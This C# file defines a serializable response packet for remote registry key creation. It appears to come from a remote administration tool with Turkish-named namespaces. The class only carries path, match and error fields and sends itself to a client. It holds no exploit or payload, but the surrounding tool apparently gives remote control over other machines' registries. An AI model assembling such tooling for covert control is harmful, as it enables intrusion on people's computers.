using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.KayıtDefteri;

namespace xServer.KuuhakuCekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetCreateRegistryKeyResponse : IPacket
    {
        public string ParentPath { get; set; }
        public RegSeekerMatch Match { get; set; }

        public bool IsError { get; set; }
        public string ErrorMsg { get; set; }

        public GetCreateRegistryKeyResponse() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
